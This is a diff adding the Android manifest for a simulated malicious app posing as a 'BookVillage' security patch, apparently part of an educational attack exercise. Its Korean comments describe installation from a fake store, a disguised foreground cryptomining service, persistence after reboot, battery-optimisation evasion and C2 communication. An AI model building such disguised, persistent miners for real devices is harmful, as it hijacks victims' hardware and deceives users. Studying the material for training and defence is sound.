@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    ══════════════════════════════════════════════════════════════════════
+     [Phase 3~5] BookVillage_Security_Patch.apk - 악성 앱 Manifest
+     교육용 시뮬레이션 - 실제 배포 불가
+    ══════════════════════════════════════════════════════════════════════
+
+    공격 구조:
+      Phase 3: 사용자가 가짜 플레이 스토어에서 이 APK를 직접 설치
+              → '공식 공지사항'을 통한 유입이므로 경고 무시하고 설치 승인
+      Phase 4: MiningService가 ForegroundService로 채굴 시작
+      Phase 5: BootReceiver가 재부팅 후 자동 재시작
+
+    취약점 / 공격 포인트:
+      - RECEIVE_BOOT_COMPLETED: 재부팅 후 자동 실행 권한
+      - FOREGROUND_SERVICE: 백그라운드 제한 우회
+      - REQUEST_INSTALL_PACKAGES: 추가 악성 APK 자가 업데이트 가능
+      - 정상 앱처럼 위장한 패키지명·앱명
+    ══════════════════════════════════════════════════════════════════════
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.bookvillage.security">
+
+    <!-- [Phase 4] ForegroundService 실행 권한 -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <!-- [Phase 5] 재부팅 후 자동 시작 권한
+         → 사용자 개입 없이 영구 지속성 확보 -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- 네트워크: C2 서버 통신 (채굴 풀 연결, 해시레이트 보고) -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- CPU 최적화 방지: 배터리 최적화 예외 요청 -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- 자가 업데이트: 추가 악성 APK 설치 가능 (실제 공격) -->
+    <!-- <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" /> -->
+
+    <application
+        android:label="BookVillage 보안"
+        android:icon="@drawable/ic_launcher"
+        android:usesCleartextTraffic="true">
+
+        <!-- 진입점 Activity: 설치 후 실행 시 초기 설정 UI 표시 (정상 앱 위장) -->
+        <activity
+            android:name=".SetupActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- [Phase 4] 채굴 서비스 - ForegroundService
+             android:foregroundServiceType: Android 14(API 34)+ 에서 필수
+             "dataSync" 타입으로 위장 (실제 공격에서는 적절한 타입 선택) -->
+        <service
+            android:name=".MiningService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- [Phase 5] 부팅 완료 수신자
+             android:exported="true" 필수: 시스템 브로드캐스트 수신을 위해
+             android:enabled="true": 항상 활성화 -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <!-- 재부팅 완료 시 수신 -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <!-- 빠른 부팅(일부 단말) 수신 -->
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
